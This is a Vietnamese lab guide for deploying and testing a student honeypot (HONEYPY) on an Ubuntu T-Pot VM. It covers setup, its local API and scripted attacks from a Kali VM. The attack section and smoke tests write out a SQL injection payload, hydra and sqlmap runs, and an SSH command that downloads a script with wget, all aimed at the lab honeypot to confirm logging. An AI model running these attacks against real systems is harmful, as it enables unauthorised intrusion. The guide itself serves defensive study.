# Guide — Chạy HONEYPY trong lab Ubuntu

Hướng dẫn từng bước để dựng, chạy và kiểm tra honeypot trên VM Ubuntu của lab.
API chỉ nghe ở `127.0.0.1:8000` — mọi lệnh kiểm tra API trong tài liệu này chạy **ngay trên Ubuntu VM**
(hoặc từ Windows qua SSH tunnel, xem mục 6).

Bối cảnh lab và lý do thiết kế: xem [CLAUDE.md](CLAUDE.md) mục 1.

| Máy | IP | Vai trò |
|---|---|---|
| Ubuntu-TPot | `192.168.62.130` | chạy HONEYPY ở **2222** (SSH) và **8081** (HTTP) |
| Kali | `192.168.62.131` | máy tấn công |

> Trên VM T-Pot, cổng 22/80/443/8080 là honeypot của T-Pot (Cowrie, wordpot…), **không** phải của dự án này.
> Vì 8080 đã bị wordpot chiếm, HTTP honeypot của HONEYPY chạy ở **8081** trên máy này.
> Không chạy `scripts/iptables.sh` và không dời sshd trên máy này. SSH quản trị thật ở cổng `64295`.

---

## 1. Chuẩn bị

Chụp snapshot VM trước khi bắt đầu. Sau đó SSH quản trị vào Ubuntu:

```bash
ssh -p 64295 <user>@192.168.62.130
```

Kiểm tra T-Pot không chiếm cổng của HONEYPY (không được có dòng nào in ra):

```bash
ss -tln | grep -E ':2222|:8081|:8000'
```

Nếu có dòng in ra, xem ai đang giữ cổng:

```bash
sudo ss -tlnp | grep :8081          # thay 8081 bằng cổng cần xem; cột cuối là tiến trình
sudo docker ps                      # container T-Pot và cổng chúng publish (vd wordpot giữ 8080)
```

Nếu là dịch vụ của T-Pot, đổi cổng của HONEYPY trong `.env` (mục 2) thay vì tắt dịch vụ của T-Pot.

---

## 2. Cài đặt

Lần đầu:

```bash
git clone https://github.com/74Teams/my_honeypot.git && cd my_honeypot
./scripts/setup_ubuntu.sh
```

Các lần sau (sau khi push code mới từ Windows):

```bash
cd my_honeypot && git pull && ./scripts/setup_ubuntu.sh
```

`setup_ubuntu.sh` (không chạy bằng `sudo`, script tự gọi `sudo` cho apt) sẽ:
- cài `python3`, `python3-venv`, `pip`, `git`, `iptables`;
- tạo `.venv/` và cài `requirements-dev.txt`;
- tạo `.env` từ `.env.example` nếu chưa có;
- tạo `data/` (quyền 700) và chạy `pytest`. Test phải pass hết.

### Cấu hình (`.env`)

Thứ tự ưu tiên: biến môi trường `HONEYPY_*` > `.env` > mặc định trong `config.py`.

`.env` được copy từ `.env.example` với `HONEYPY_HTTP_PORT=8080` (mặc định cho VM Ubuntu sạch kiểu B).
**Trên máy T-Pot phải sửa thành 8081**:

```bash
sed -i 's/^HONEYPY_HTTP_PORT=.*/HONEYPY_HTTP_PORT=8081/' .env
```

`.env` trên máy T-Pot sau khi sửa:

```ini
HONEYPY_BIND_ADDRESS=0.0.0.0
HONEYPY_SSH_PORT=2222
HONEYPY_HTTP_PORT=8081
HONEYPY_HTTP_USERNAME=admin
HONEYPY_HTTP_PASSWORD=password
```

`setup_ubuntu.sh` không ghi đè `.env` đã có, nên chỉ cần sửa một lần.

Dữ liệu sinh ra khi chạy nằm trong `data/`:
- `data/honeypot.db` — SQLite, nơi mọi sự kiện được ghi;
- `data/logs/` — log text;
- `data/server.key` — host key SSH, tự sinh ở lần chạy đầu.

---

## 3. Chạy honeypot

Mỗi tiến trình chạy một thành phần, nên cần 3 terminal (hoặc 3 cửa sổ `tmux`):

```bash
sudo apt-get install -y tmux      # nếu chưa có
tmux new -s honeypy               # Ctrl-b c: tạo cửa sổ mới, Ctrl-b n: chuyển cửa sổ, Ctrl-b d: thoát giữ chạy
```

Trong mỗi cửa sổ, vào repo và kích hoạt venv trước:

```bash
cd ~/my_honeypot && source .venv/bin/activate
```

| Cửa sổ | Lệnh | Nghe ở |
|---|---|---|
| 1 — SSH | `python3 honeypy.py --ssh` | `0.0.0.0:2222` |
| 2 — HTTP | `python3 honeypy.py --http` | `0.0.0.0:8081` (theo `.env`) |
| 3 — API | `uvicorn api:app --host 127.0.0.1 --port 8000` | `127.0.0.1:8000` |

> API **luôn** dùng `--host 127.0.0.1`, không bao giờ `0.0.0.0`: attacker trên Kali không được thấy
> nơi đang ghi dữ liệu của họ.

Tuỳ chọn ghi đè của `honeypy.py`:

```bash
python3 honeypy.py --ssh -p 2223                   # đổi cổng
python3 honeypy.py --ssh -u root -pw toor          # chỉ chấp nhận đúng cặp này (mặc định: nhận mọi mật khẩu)
python3 honeypy.py --http -u admin -pw secret      # tài khoản đăng nhập đúng của trang WordPress giả
```

Kiểm tra cả ba đang nghe:

```bash
ss -tlnp | grep -E ':2222|:8081|:8000'
```

Kết quả mong đợi: `0.0.0.0:2222`, `0.0.0.0:8081`, `127.0.0.1:8000`.
Nếu HTTP báo nghe ở 8080 thì `.env` chưa được sửa (mục 2).

Dừng: `Ctrl-C` trong từng cửa sổ; `tmux attach -t honeypy` để quay lại phiên.

---

## 4. Smoke test trên chính Ubuntu (127.0.0.1)

Mở thêm một terminal trên Ubuntu. Các bước này kiểm tra honeypot ghi được sự kiện **trước khi** tấn công
từ Kali. Sự kiện sinh ra ở bước này sẽ có `src_ip = 127.0.0.1` — đúng như mong đợi khi test local.

### 4.1 API sống

```bash
curl -s http://127.0.0.1:8000/health
# {"status":"ok"}
```

### 4.2 Sinh sự kiện SSH

```bash
ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@127.0.0.1
# nhập mật khẩu bất kỳ, gõ vài lệnh: whoami, pwd, ls, rồi exit
```

Hai tuỳ chọn `-o` tránh ghi host key của honeypot vào `~/.ssh/known_hosts` của bạn
(host key thay đổi mỗi khi xoá `data/`).

### 4.3 Sinh sự kiện HTTP

```bash
curl -s http://127.0.0.1:8081/ | head -n 5                         # trang login WordPress giả
curl -s -X POST http://127.0.0.1:8081/wp-admin-login \
     -d "username=admin&password=wrong"                             # đăng nhập sai
curl -s -X POST http://127.0.0.1:8081/wp-admin-login \
     --data-urlencode "username=' OR 1=1--" -d "password=x"         # payload SQLi
```

### 4.4 Đọc lại qua API

`python3 -m json.tool` chỉ để in JSON cho dễ đọc (không cần cài thêm gì):

```bash
API=http://127.0.0.1:8000

curl -s "$API/events?limit=20"                         | python3 -m json.tool
curl -s "$API/events?honeypot=ssh&event_type=command"  | python3 -m json.tool
curl -s "$API/events?honeypot=http"                    | python3 -m json.tool
curl -s "$API/stats/summary"                           | python3 -m json.tool
```

Phải thấy:
- `ssh` / `auth_attempt` có `username=root` và mật khẩu bạn vừa gõ;
- `ssh` / `command` cho từng lệnh đã gõ;
- `http` / `http_login`, bản ghi SQLi có `attack_tag = "sqli"`.

Nếu thiếu sự kiện, xem mục 8.

---

## 5. Tham chiếu API

Tất cả là `GET`, base URL `http://127.0.0.1:8000`. Trang thử API tự sinh: `http://127.0.0.1:8000/docs`.

| Endpoint | Tham số | Trả về |
|---|---|---|
| `/health` | — | `{"status": "ok"}` |
| `/events` | `honeypot` (`ssh`\|`http`), `event_type`, `src_ip`, `since_minutes`, `limit` (1–1000, mặc định 100) | sự kiện mới nhất trước |
| `/stats/summary` | — | tổng số sự kiện, số IP khác nhau, đếm theo `honeypot` + `event_type` |
| `/stats/top-ips` | `limit` (1–100) | IP có nhiều sự kiện nhất |
| `/stats/top-credentials` | `limit` (1–100) | cặp username/password bị thử nhiều nhất (SSH + HTTP) |
| `/stats/bruteforce` | `window_minutes` (mặc định 10), `threshold` (mặc định 5) | IP có ≥ `threshold` lần thử đăng nhập trong cửa sổ |

`event_type` hiện có: `auth_attempt`, `command` (SSH); `http_login` (HTTP).
Trường `ts` là unix time (giây, UTC) — đổi sang giờ đọc được: `date -d @<ts>`.

Ví dụ:

```bash
curl -s "$API/events?src_ip=192.168.62.131&since_minutes=30" | python3 -m json.tool
curl -s "$API/stats/top-credentials?limit=20"                 | python3 -m json.tool
curl -s "$API/stats/bruteforce?window_minutes=5&threshold=20" | python3 -m json.tool
```

Truy vấn thẳng DB khi cần (chỉ đọc):

```bash
sqlite3 -readonly data/honeypot.db \
  "SELECT datetime(ts,'unixepoch'), honeypot, event_type, src_ip, username, command, attack_tag
   FROM events ORDER BY id DESC LIMIT 20;"
```

(`sudo apt-get install -y sqlite3` nếu chưa có.)

---

## 6. Xem API từ Windows host

API chỉ nghe ở `127.0.0.1` của Ubuntu, nên từ Windows phải đi qua SSH tunnel bằng cổng quản trị:

```powershell
ssh -p 64295 -L 8000:127.0.0.1:8000 <user>@192.168.62.130
```

Giữ cửa sổ đó mở, rồi trên Windows mở `http://127.0.0.1:8000/docs` hoặc:

```powershell
curl.exe -s http://127.0.0.1:8000/stats/summary
```

(Trên VM Ubuntu sạch kiểu B, cổng quản trị là `22222` thay vì `64295`.)

---

## 7. Tấn công từ Kali

Chỉ làm sau khi mục 4 đã pass. Trên Kali:

```bash
IP=192.168.62.130
SSH_PORT=2222        # máy T-Pot: luôn 2222
HTTP_PORT=8081       # máy T-Pot: luôn 8081 — 8080 là wordpot của T-Pot
```

| Kịch bản | Lệnh trên Kali | Cổng | Kiểm tra trên Ubuntu |
|---|---|---|---|
| Quét dịch vụ | `nmap -sV -p $SSH_PORT,$HTTP_PORT $IP` | `$SSH_PORT`, `$HTTP_PORT` | log của 2 cửa sổ honeypot (baseline: 0 sự kiện trong DB) |
| SSH brute-force | `hydra -s $SSH_PORT -l root -P /usr/share/wordlists/rockyou.txt -t 4 ssh://$IP` | `$SSH_PORT` | `/stats/bruteforce`, `/stats/top-credentials` |
| SSH tương tác | `ssh -p $SSH_PORT root@$IP` rồi gõ lệnh | `$SSH_PORT` | `/events?honeypot=ssh&event_type=command` |
| SSH exec | `ssh -p $SSH_PORT root@$IP 'uname -a; wget http://x/a.sh'` | `$SSH_PORT` | hiện **chưa** vào DB (nợ kỹ thuật #4), chỉ có trong `data/logs/` |
| Web SQLi | `sqlmap -u http://$IP:$HTTP_PORT/wp-admin-login --data "username=a&password=b" --batch` | `$HTTP_PORT` | `/events?event_type=http_login`, `attack_tag=sqli` |
| Web scan | `nikto -h http://$IP:$HTTP_PORT` | `$HTTP_PORT` | hiện chỉ POST `/wp-admin-login` được ghi (nợ kỹ thuật #5) |

`rockyou.txt` trên Kali có thể còn nén: `sudo gunzip /usr/share/wordlists/rockyou.txt.gz`.
Bắt đầu với `-t 4`; `-t 64` dùng để thử giới hạn tài nguyên ở Giai đoạn 1.

Tiêu chí đạt cho mọi kịch bản:
- `src_ip` của sự kiện là `192.168.62.131` (IP Kali), không phải `127.0.0.1`;
- sự kiện xuất hiện trong API, ứng với cổng `2222` (SSH) hoặc `8081` (HTTP). Schema DB hiện tại chưa có cột
  `dst_port` (sẽ thêm ở Giai đoạn 1), nên tạm thời đối chiếu bằng biến `$SSH_PORT`/`$HTTP_PORT` đã dùng trên Kali
  và log của cửa sổ honeypot. Nếu Kali chạy xong mà không có gì, gần như chắc chắn đã đánh nhầm vào
  Cowrie (22), cổng 80, hay wordpot (8080) của T-Pot.

Ghi lại cái gì đã/chưa được ghi ở lần chạy đầu — đó là mốc so sánh cho Giai đoạn 1.

---

## 8. Xử lý sự cố

| Triệu chứng | Nguyên nhân / cách xử lý |
|---|---|
| `Address already in use` khi chạy honeypot | cổng bị chiếm: `sudo ss -tlnp \| grep :<cổng>` và `sudo docker ps`. Nếu là T-Pot (vd wordpot ở 8080) thì đổi cổng trong `.env`; nếu là HONEYPY cũ thì dừng nó. |
| HTTP honeypot nghe ở 8080 trên máy T-Pot | `.env` chưa đặt `HONEYPY_HTTP_PORT=8081` (mục 2). |
| `curl 127.0.0.1:8000` bị từ chối | chưa chạy `uvicorn`, hoặc chạy sai thư mục — phải đứng ở thư mục repo khi gọi `uvicorn api:app`. |
| Kali không kết nối được 2222/8081 | `sudo ufw status`; nếu ufw bật: `sudo ufw allow 2222/tcp && sudo ufw allow 8081/tcp`. Kiểm tra 2 VM cùng mạng: `ping 192.168.62.130` từ Kali. |
| `ssh` báo `REMOTE HOST IDENTIFICATION HAS CHANGED` | host key honeypot đã sinh lại. Dùng các tuỳ chọn `-o` ở mục 4.2, hoặc `ssh-keygen -R "[127.0.0.1]:2222"`. |
| API trả `[]` dù đã tấn công | honeypot và API đọc khác DB (khác `HONEYPY_DATA_DIR`), hoặc đánh nhầm cổng T-Pot. Kiểm tra `ls -l data/honeypot.db` có thời gian sửa mới. |
| `ModuleNotFoundError` | chưa `source .venv/bin/activate`. |
| `setup_ubuntu.sh` báo `Permission denied` | `chmod +x scripts/*.sh` hoặc chạy `bash scripts/setup_ubuntu.sh`. |

---

## 9. Dọn dẹp sau một đợt tấn công

```bash
# lưu dữ liệu đợt này trước khi xoá (không commit file này)
cp data/honeypot.db ~/honeypy-$(date +%Y%m%d-%H%M).db

# bắt đầu đợt mới với DB trống (dừng cả 3 tiến trình trước)
rm -f data/honeypot.db data/honeypot.db-wal data/honeypot.db-shm
```

Không xoá `data/server.key` nếu không cần — xoá thì host key đổi và client đã từng kết nối sẽ cảnh báo.
Khôi phục snapshot VM nếu có nghi ngờ máy đã bị thay đổi ngoài ý muốn.
